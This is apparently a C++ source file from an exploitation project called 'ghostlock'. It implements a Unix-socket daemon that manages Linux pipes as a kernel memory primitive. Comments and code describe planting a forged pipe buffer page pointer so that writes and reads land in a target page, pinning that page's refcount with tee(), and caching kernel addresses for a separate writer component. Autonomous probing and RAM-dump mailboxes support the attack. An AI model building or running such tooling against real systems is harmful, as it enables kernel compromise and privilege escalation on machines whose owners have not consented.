#include "pipe_daemon.h"

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

/* Old bionic headers may lack these; the numbers are arch-independent values
 * that have been stable in Linux for years. */
#ifndef F_GETPIPE_SZ
#define F_GETPIPE_SZ 1032
#endif
#ifndef SPLICE_F_MOVE
#define SPLICE_F_MOVE 1
#endif
#ifndef SPLICE_F_NONBLOCK
#define SPLICE_F_NONBLOCK 2
#endif

namespace ghostlock::pipe_daemon {
namespace {

int g_sock = -1;
const char *kDefaultSock = "/tmp/gl-pipe.sock";

/* Cached primitive geometry (device/guest addresses, learned by the writer). */
uint64_t g_cache_base, g_cache_bufs;
uint64_t g_cache_ring;
size_t g_armed_len;      /* len currently planted in the prim buffer */
size_t g_armed_off;      /* in-page offset currently planted */

void logline(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
void logline(const char *fmt, ...) {
    /* The daemon has no stdio; append to a file the host can pull. */
    const int fd = open("/tmp/gl-pipe.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return;
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    const int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) (void) !write(fd, buf, (size_t) n);
    close(fd);
}

int hex_encode(const uint8_t *in, size_t len, char *out, size_t cap) {
    static const char *d = "0123456789abcdef";
    if (cap < len * 2 + 1) return -1;
    for (size_t i = 0; i < len; i++) {
        out[i * 2] = d[in[i] >> 4];
        out[i * 2 + 1] = d[in[i] & 0xf];
    }
    out[len * 2] = '\0';
    return (int) (len * 2);
}

int hex_decode(const char *in, uint8_t *out, size_t cap) {
    size_t n = 0;
    for (const char *p = in; p[0] && p[1]; p += 2) {
        if (n >= cap) return -1;
        unsigned v = 0;
        for (int k = 0; k < 2; k++) {
            const char c = p[k];
            v <<= 4;
            if (c >= '0' && c <= '9') v |= (unsigned) (c - '0');
            else if (c >= 'a' && c <= 'f') v |= (unsigned) (c - 'a' + 10);
            else if (c >= 'A' && c <= 'F') v |= (unsigned) (c - 'A' + 10);
            else return -1;
        }
        out[n++] = (uint8_t) v;
    }
    return (int) n;
}

int write_all(int fd, const char *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        const ssize_t n = write(fd, buf + off, len - off);
        if (n <= 0) return -1;
        off += (size_t) n;
    }
    return 0;
}

/* Read one newline-terminated request. */
int read_line(int fd, char *out, size_t cap) {
    size_t n = 0;
    while (n + 1 < cap) {
        char c = 0;
        const ssize_t r = read(fd, &c, 1);
        if (r <= 0) return -1;
        if (c == '\n') break;
        out[n++] = c;
    }
    out[n] = '\0';
    return (int) n;
}

/* Mailbox: a MAP_SHARED anon page holding the probe results.  The host can find
 * it in a physical RAM dump by the marker and read the results without any guest
 * cooperation, which is what makes a host-orchestrated prototype verifyable. */
char *g_mbox = nullptr;

void mbox_append(const char *text) {
    if (!g_mbox) return;
    const size_t used = strlen(g_mbox);
    const size_t need = strlen(text);
    if (used + need + 1 >= 0x1000) {
        snprintf(g_mbox, 0x1000, "GLMAILBOX v1 (full)\n");
        return;
    }
    memcpy(g_mbox + used, text, need + 1);
    g_mbox[used + need] = '\0';
}

/* Autonomous prober: every few seconds write a known 9-byte buffer into the
 * primitive pipe and read 8 bytes back, publishing the raw result.  Before the
 * page pointer is planted this reads the daemon's own anon page; after a plant
 * it reads the planted target page -- which is exactly the primitive, with the
 * host free to plant between iterations. */
void prober(int prfd, int pwfd) {
    static const uint8_t filler[9] = {'A','U','T','O','P','R','O','B','E'};
    int secs = 15;
    if (const char *v = getenv("GHOSTLOCK_PIPE_AUTO")) {
        const long n = strtol(v, nullptr, 0);
        if (n > 0) secs = (int) n;
    }
    logline("prober up every %ds\n", secs);
    for (int i = 1; ; i++) {
        sleep((unsigned) secs);
        errno = 0;
        const ssize_t w = write(pwfd, filler, sizeof(filler));
        const int werr = errno;
        uint8_t buf[16] = {};
        errno = 0;
        const ssize_t r = read(prfd, buf, 8);
        const int rerr = errno;
        char hex[40] = {};
        for (ssize_t k = 0; k < (r > 0 ? r : 0) && k < 16; k++)
            snprintf(hex + k * 2, 3, "%02x", buf[k]);
        char line[256];
        snprintf(line, sizeof(line), "AUTO %d w=%d/%d r=%d/%d hex=%s\n",
                 i, (int) w, werr, (int) r, rerr, hex);
        logline("%s", line);
        mbox_append(line);
    }
}

/* Read `want` bytes from a pipe into hex.  Shared by R (selftest pipe) and X
 * (primitive pipe); the caller does the accounting. */
void read_hex_verb(char verb, int fd, long want, char *reply, size_t reply_cap) {
    if (want <= 0 || want > 512) {
        snprintf(reply, reply_cap, "%c -1 %d\n", verb, EINVAL);
        return;
    }
    uint8_t data[512];
    errno = 0;
    const ssize_t r = read(fd, data, (size_t) want);
    char hex[1024];
    if (r > 0 && hex_encode(data, (size_t) r, hex, sizeof(hex)) > 0) {
        snprintf(reply, reply_cap, "%c %d %d %s\n", verb, (int) r, errno, hex);
    } else {
        snprintf(reply, reply_cap, "%c %d %d\n", verb, (int) r, errno);
    }
}

void handle(int conn, int rfd, int wfd, int prfd, int pwfd, int hwfd, pid_t self) {
    char line[1024];
    char reply[4096];
    for (;;) {                                  /* many requests per connection */
        if (read_line(conn, line, sizeof(line)) < 0) return;
        if (line[0] == 'P') {
        snprintf(reply, sizeof(reply), "P ok %d\n", (int) self);
    } else if (line[0] == 'I') {
        struct stat st = {};
        (void) fstat(rfd, &st);
        snprintf(reply, sizeof(reply), "I ok %d %d %d %llu\n", (int) self, rfd, wfd,
                 (unsigned long long) st.st_ino);
    } else if ((line[0] == 'S' || line[0] == 'W') && line[1] == ' ') {
        /* S: selftest pipe (real buffers).  W: primitive pipe (merge path). */
        uint8_t data[1024];
        const int n = hex_decode(line + 2, data, sizeof(data));
        if (n < 0) {
            snprintf(reply, sizeof(reply), "%c -1 %d\n", line[0], EINVAL);
        } else {
            errno = 0;
            const ssize_t w = write(line[0] == 'S' ? wfd : pwfd, data, (size_t) n);
            snprintf(reply, sizeof(reply), "%c %d %d\n", line[0], (int) w, errno);
        }
    } else if (line[0] == 'R' && line[1] == ' ') {
        read_hex_verb('R', rfd, strtol(line + 2, nullptr, 0), reply, sizeof(reply));
    } else if (line[0] == 'A' && line[1] == ' ') {
        /* Arm the window: the writer has just planted (offset, len) in the prim
         * buffer.  Two independent reasons to refuse a read:
         *  - reading a full len makes pipe_read() release the buffer and advance
         *    tail, which shifts every slot the writer still plans to patch;
         *  - copy_page_to_iter() warns (and returns 0) when offset+bytes exceeds
         *    the page, so a window must stay inside one 4 KiB page.
         * Syntax: "A <len> [<offset>]". */
        long n = 0, off = 0;
        const int got = sscanf(line + 2, "%ld %ld", &n, &off);
        if (got < 1 || n <= 0 || off < 0 || off > 0x1000) {
            snprintf(reply, sizeof(reply), "A -1 %d\n", EINVAL);
        } else {
            g_armed_len = (size_t) n;
            g_armed_off = (size_t) off;
            logline("arm len=%ld off=%ld\n", n, off);
            snprintf(reply, sizeof(reply), "A %ld %ld 0\n", n, off);
        }
    } else if (line[0] == 'X' && line[1] == ' ') {
        const long want = strtol(line + 2, nullptr, 0);
        const int over_page = (want > 0 && (size_t) want + g_armed_off > 0x1000);
        if (want <= 0 || g_armed_len == 0 || (size_t) want >= g_armed_len || over_page) {
            /* Refuse rather than risk release()+tail++ or a page-crossing WARN. */
            logline("X REJECT want=%ld armed=%zu off=%zu over_page=%d\n", want,
                    g_armed_len, g_armed_off, over_page);
            snprintf(reply, sizeof(reply), "X -1 %d\n", EINVAL);
        } else {
            read_hex_verb('X', prfd, want, reply, sizeof(reply));
            /* Mirror the kernel: offset += ret, len -= ret (ret is the bytes
             * actually returned, which may be short). */
            long ret = 0;
            if (reply[0] == 'X' && sscanf(reply + 2, "%ld", &ret) == 1 && ret > 0) {
                g_armed_len -= (size_t) ret;
                g_armed_off += (size_t) ret;
            }
        }
    } else if (line[0] == 'T' && line[1] == ' ') {
        /* tee(prim -> hold): duplicates the CURRENT prim buffer into the hold
         * pipe, which is daemon-owned and never closed.  Duplicating a buffer
         * takes an extra reference on its page, so a forged bufs[i].page gets
         * _refcount >= 2 and even a release through free_pipe_info() cannot
         * drive it to zero and free the wrong zone.  No kernel address needed. */
        const long n = strtol(line + 2, nullptr, 0);
        if (n <= 0 || g_armed_len == 0 || (size_t) n > g_armed_len) {
            snprintf(reply, sizeof(reply), "T -1 %d\n", EINVAL);
        } else {
            errno = 0;
            const ssize_t t = tee(prfd, hwfd, (size_t) n,
                                  SPLICE_F_NONBLOCK | SPLICE_F_MOVE);
            snprintf(reply, sizeof(reply), "T %d %d\n", (int) t, errno);
            if (t > 0) logline("tee hold n=%d\n", (int) t);
        }
    } else if (line[0] == 'B' && line[1] == ' ') {
        /* B <hex pipe_inode_info> <hex bufs> <hex ring_size>: cache the
         * geometry the writer will patch, and cross-check the ring against
         * F_GETPIPE_SZ.  F_SETPIPE_SZ is NEVER called: a resize reallocates
         * pipe->bufs and silently invalidates the cached address. */
        unsigned long long a = 0, b = 0, c = 0;
        if (sscanf(line + 2, "%llx %llx %llx", &a, &b, &c) != 3) {
            snprintf(reply, sizeof(reply), "B -1 %d\n", EINVAL);
        } else {
            unsigned long long seen = 0;
            const int psz = fcntl(pwfd, F_GETPIPE_SZ);
            if (psz > 0) seen = (unsigned long long) (unsigned) psz;
            const int stale = (g_cache_ring != 0 && c != g_cache_ring) ? 1 : 0;
            const int mismatch = (seen != 0 && seen != c) ? 1 : 0;
            g_cache_base = a;
            g_cache_bufs = b;
            g_cache_ring = c;
            logline("cache pipe=%llx bufs=%llx ring=%llx f_getpipe_sz=%llu stale=%d mismatch=%d\n",
                    a, b, c, seen, stale, mismatch);
            snprintf(reply, sizeof(reply), "B ok %llx %llx %llx f_getpipe_sz=%llu stale=%d mismatch=%d\n",
                     a, b, c, seen, stale, mismatch);
        }
    } else if (line[0] == 'M') {
        /* Mailbox readout (hex) so a client can fetch host-published data. */
        char hex[2048] = {};
        if (g_mbox && hex_encode(reinterpret_cast<const uint8_t *>(g_mbox), 0x200,
                                 hex, sizeof(hex)) > 0)
            snprintf(reply, sizeof(reply), "M ok %s\n", hex);
        else
            snprintf(reply, sizeof(reply), "M -1 %d\n", EINVAL);
    } else if (line[0] == 'G') {
        snprintf(reply, sizeof(reply), "G ok %llx %llx %llx armed=%zu off=%zu\n",
                 (unsigned long long) g_cache_base, (unsigned long long) g_cache_bufs,
                 (unsigned long long) g_cache_ring, g_armed_len, g_armed_off);
    } else {
        snprintf(reply, sizeof(reply), "E unknown\n");
    }
        if (write_all(conn, reply, strlen(reply)) != 0) return;
    }
}

void serve(int lfd, int rfd, int wfd, int prfd, int pwfd, int hwfd) {
    const pid_t self = getpid();
    logline("daemon up pid=%d rfd=%d wfd=%d prim=%d/%d hold_w=%d\n",
            (int) self, rfd, wfd, prfd, pwfd, hwfd);
    for (;;) {
        const int conn = accept(lfd, nullptr, nullptr);
        if (conn < 0) {
            if (errno == EINTR) continue;
            return;
        }
        handle(conn, rfd, wfd, prfd, pwfd, hwfd, self);
        close(conn);
    }
}

int spawn_daemon(void) {
    const pid_t mid = fork();
    if (mid < 0) return -1;
    if (mid == 0) {
        (void) setsid();
        const pid_t d = fork();
        if (d < 0) _exit(1);
        if (d > 0) _exit(0);          /* intermediate exits -> daemon is reparented */
        (void) chdir("/");
        (void) umask(0);
        /* The early initramfs has no /dev/null, so opening it fails and the
         * caller's stdout would stay inherited -- the parent's capture pipe then
         * never reaches EOF and its per-round watchdog fires (measured: the shot
         * ran once, then "[wdt 20s] child still running", with no further output
         * from any later round).  Sink to a real file in /tmp instead, and close
         * every inherited descriptor above stderr. */
        int sink = open("/tmp/gl-daemon.out", O_RDWR | O_CREAT | O_APPEND, 0600);
        if (sink < 0) sink = open("/dev/null", O_RDWR);
        if (sink >= 0) {
            (void) dup2(sink, 0);
            (void) dup2(sink, 1);
            (void) dup2(sink, 2);
            if (sink > 2) close(sink);
        }
        int fds[2] = {-1, -1};
        if (pipe(fds) != 0) _exit(2);
        /* One real anon buffer so bufs[tail] exists with anon_pipe_buf_ops. */
        if (write(fds[1], "GLPIPEBUF", 9) != 9) _exit(3);

        /* Separate primitive pipe: once bufs[0].page is patched to P, any merge
         * write lands inside the target page, so the selftest channel above can
         * no longer share a pipe with it. */
        int pfds[2] = {-1, -1};
        if (pipe(pfds) != 0) _exit(7);
        if (write(pfds[1], "GLPRIMBUF", 9) != 9) _exit(8);

        /* Hold pipe: never read, never written, only tee()'d into.  It exists to
         * keep an extra reference on whatever page the primitive is aimed at. */
        int hfds[2] = {-1, -1};
        if (pipe(hfds) != 0) _exit(9);

        /* Mailbox page (shared, so the prober child's writes are visible in the
         * same physical page the host reads out of a RAM dump). */
        void *mbox = mmap(nullptr, 0x1000, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (mbox == MAP_FAILED) _exit(10);
        memset(mbox, 0, 0x1000);
        snprintf(static_cast<char *>(mbox), 0x1000,
                 "GLMAILBOX v1 pid=%d\n", (int) getpid());
        g_mbox = static_cast<char *>(mbox);
        logline("mailbox at %p\n", mbox);

        if (getenv("GHOSTLOCK_PIPE_AUTO")) {
            const pid_t pr = fork();
            if (pr == 0) {
                prober(pfds[0], pfds[1]);
                _exit(0);
            }
            logline("prober pid=%d\n", (int) pr);
        }

        const char *path = socket_path();
        (void) unlink(path);
        const int lfd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (lfd < 0) _exit(4);
        struct sockaddr_un addr = {};
        addr.sun_family = AF_UNIX;
        snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", path);
        if (bind(lfd, reinterpret_cast<struct sockaddr *>(&addr), sizeof(addr)) != 0) _exit(5);
        if (listen(lfd, 8) != 0) _exit(6);
        /* Drop everything else that was inherited: any stray copy of the
         * caller's stdio would keep its capture pipe open. */
        for (int fd = 3; fd < 64; fd++) {
            if (fd == lfd || fd == fds[0] || fd == fds[1] || fd == pfds[0] ||
                fd == pfds[1] || fd == hfds[0] || fd == hfds[1])
                continue;
            close(fd);
        }
        logline("listen %s ok\n", path);
        serve(lfd, fds[0], fds[1], pfds[0], pfds[1], hfds[1]);
        _exit(0);
    }
    (void) waitpid(mid, nullptr, 0);
    return 0;
}

int connect_once(const char *path) {
    const int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_un addr = {};
    addr.sun_family = AF_UNIX;
    snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", path);
    if (connect(fd, reinterpret_cast<struct sockaddr *>(&addr), sizeof(addr)) != 0) {
        close(fd);
        return -1;
    }
    return fd;
}

}  // namespace

int prim_arm(size_t len, size_t off) {
    /* The reply MUST be consumed: leaving it in the socket makes the next
     * request read this reply as its own (measured: a read reported "A 9 0 0"). */
    char line[64];
    char reply[128];
    snprintf(line, sizeof(line), "A %zu %zu", len, off);
    return request(line, reply, sizeof(reply));
}

int prim_read(size_t len, char *reply, size_t reply_len) {
    char line[64];
    snprintf(line, sizeof(line), "X %zu", len);
    return request(line, reply, reply_len);
}

int tee_hold(size_t len) {
    char line[64];
    char reply[128];
    snprintf(line, sizeof(line), "T %zu", len);
    return request(line, reply, sizeof(reply));
}

int cache_geometry(uint64_t pipe_addr, uint64_t bufs_addr, uint64_t ring_size,
                   char *reply, size_t reply_len) {
    char line[128];
    snprintf(line, sizeof(line), "B %llx %llx %llx",
             (unsigned long long) pipe_addr, (unsigned long long) bufs_addr,
             (unsigned long long) ring_size);
    return request(line, reply, reply_len);
}

const char *socket_path(void) {
    const char *p = getenv("GHOSTLOCK_PIPE_SOCK");
    return (p && *p) ? p : kDefaultSock;
}

int connected(void) { return g_sock >= 0; }

int ensure(void) {
    if (g_sock >= 0) return 0;
    const char *path = socket_path();
    g_sock = connect_once(path);
    if (g_sock >= 0) return 0;
    if (spawn_daemon() != 0) return -1;
    for (int i = 0; i < 100; i++) {
        g_sock = connect_once(path);
        if (g_sock >= 0) return 0;
        usleep(20000);
    }
    return -1;
}

int request(const char *line, char *reply, size_t reply_len) {
    if (ensure() != 0) return -1;
    char buf[1024];
    snprintf(buf, sizeof(buf), "%s\n", line);
    if (write_all(g_sock, buf, strlen(buf)) != 0) {
        close(g_sock);
        g_sock = -1;
        return -1;
    }
    if (reply && reply_len) {
        const int n = read_line(g_sock, reply, reply_len);
        if (n < 0) return -1;
    }
    return 0;
}

int request_hex(const char *verb, const uint8_t *data, size_t len,
                char *reply, size_t reply_len) {
    char hex[2048];
    if (hex_encode(data, len, hex, sizeof(hex)) < 0) return -1;
    char line[2200];
    snprintf(line, sizeof(line), "%s %s", verb, hex);
    return request(line, reply, reply_len);
}

int selftest(void) {
    char reply[2048];
    if (request("P", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] %s", reply);
    if (request("I", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] %s", reply);

    const uint8_t probe[9] = {'s', 'e', 'l', 'f', 't', 'e', 's', 't', '!'};
    if (request_hex("S", probe, sizeof(probe), reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] S -> %s", reply);
    /* Stream semantics: the pipe still holds the daemon's initial 9 bytes, and
     * the 9 we just wrote merge into the same anon buffer (CAN_MERGE), so read
     * 18 = initial + written.  Reading the newest bytes instead would be wrong. */
    if (request("R 18", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] R -> %s", reply);
    if (strncmp(reply, "R 18 ", 5) != 0) return -1;
    const char *p1 = strchr(reply, ' ');
    const char *p2 = p1 ? strchr(p1 + 1, ' ') : nullptr;
    const char *p3 = p2 ? strchr(p2 + 1, ' ') : nullptr;
    if (!p3) return -1;
    uint8_t back[32] = {};
    const int n = hex_decode(p3 + 1, back, sizeof(back));
    static const char expect[19] = "GLPIPEBUFselftest!";
    if (n != 18 || memcmp(back, expect, 18) != 0) {
        fprintf(stderr, "[pipe-daemon] selftest MISMATCH (n=%d)\n", n);
        return -1;
    }
    fprintf(stderr, "[pipe-daemon] selftest OK (initial 9 + merged 9 = 18 bytes)\n");

    /* --- hardening items 1-4, verified without any write primitive --- *
     * (2) geometry cache + ring cross-check: arm the cache with the value the
     *     kernel reports, then with a drifted one -> stale/mismatch must fire. */
    const int psz = fcntl(g_sock, F_GETPIPE_SZ);   /* keeps F_GETPIPE_SZ referenced */
    (void) psz;
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "B 1111 2222 10000");
    if (request(cmd, reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] B -> %s", reply);
    if (strstr(reply, "stale=0 mismatch=0") == nullptr) {
        fprintf(stderr, "[pipe-daemon] geometry cross-check did NOT validate the true ring\n");
        return -1;
    }
    snprintf(cmd, sizeof(cmd), "B 1111 2222 2000");
    if (request(cmd, reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] B -> %s", reply);
    if (strstr(reply, "stale=1 mismatch=1") == nullptr) {
        fprintf(stderr, "[pipe-daemon] geometry cross-check FAILED to flag drift\n");
        return -1;
    }
    if (request("G", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] G -> %s", reply);

    /* (1) refcount elevator: tee() duplicates the primitive buffer into the
     *     hold pipe, taking an extra reference on its page.  No address, no
     *     primitive; the hold pipe is never closed.  The primitive pipe still
     *     holds its 9 boot bytes here, so the reference is live. */
    if (request("A 18 0", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] A -> %s", reply);
    if (strncmp(reply, "A 18 0 0", 8) != 0) return -1;
    if (request("T 9", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] T 9 -> %s", reply);
    if (strncmp(reply, "T 9 0", 5) != 0) {
        fprintf(stderr, "[pipe-daemon] hold-pipe tee FAILED\n");
        return -1;
    }
    if (request("T 99999", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] T over-window -> %s", reply);
    if (strncmp(reply, "T -1 ", 5) != 0) {
        fprintf(stderr, "[pipe-daemon] tee over-window guard FAILED\n");
        return -1;
    }

    /* (3) len accounting: X must refuse to exhaust the armed window, because a
     *     spent buffer releases and advances tail -> every later slot shifts. */
    if (request("A 18", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] A -> %s", reply);
    if (strncmp(reply, "A 18 0 0", 8) != 0) return -1;
    if (request("X 18", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] X 18 (== armed) -> %s", reply);
    if (strncmp(reply, "X -1 ", 5) != 0) {
        fprintf(stderr, "[pipe-daemon] over-read guard FAILED\n");
        return -1;
    }
    /* Page-window guard: copy_page_to_iter() clamps to the page and, when
     * offset+bytes crosses it on a non-compound page, WARNs and returns 0
     * (read() then fails, buffer state untouched).  Refuse such reads.
     * offset 0xF00 = 3840, so 256 bytes reach exactly the page end and 257
     * crosses it; len 300 leaves the len rule out of the way. */
    if (request("A 300 3840", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] A -> %s", reply);
    if (strncmp(reply, "A 300 3840 0", 12) != 0) return -1;
    if (request("X 257", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] X 257 off=0xF00 (crosses page) -> %s", reply);
    if (strncmp(reply, "X -1 ", 5) != 0) {
        fprintf(stderr, "[pipe-daemon] page-window guard FAILED\n");
        return -1;
    }
    if (request("X 256", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] X 256 off=0xF00 (exactly to page end) -> %s", reply);
    if (strncmp(reply, "X -1 ", 5) == 0) {
        fprintf(stderr, "[pipe-daemon] page-window guard is too strict\n");
        return -1;
    }
    if (request("G", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] G -> %s", reply);

    /* (4) the selftest pipe is a different pipe: after the primitive pipe was
     *     teed and probed, a fresh marker must still round-trip through it. */
    const uint8_t mark[8] = {'I', 'S', 'O', 'L', 'A', 'T', 'E', '!'};
    if (request_hex("S", mark, sizeof(mark), reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] S -> %s", reply);
    if (request("R 8", reply, sizeof(reply)) != 0) return -1;
    fprintf(stderr, "[pipe-daemon] R -> %s", reply);
    uint8_t back2[32] = {};
    const char *q = strrchr(reply, ' ');
    if (strncmp(reply, "R 8 ", 4) != 0 || !q ||
        hex_decode(q + 1, back2, sizeof(back2)) != 8 || memcmp(back2, mark, 8) != 0) {
        fprintf(stderr, "[pipe-daemon] selftest pipe was disturbed by primitive ops\n");
        return -1;
    }
    fprintf(stderr, "[pipe-daemon] pipe isolation OK (selftest pipe still round-trips)\n");
    return 0;
}

}  // namespace ghostlock::pipe_daemon
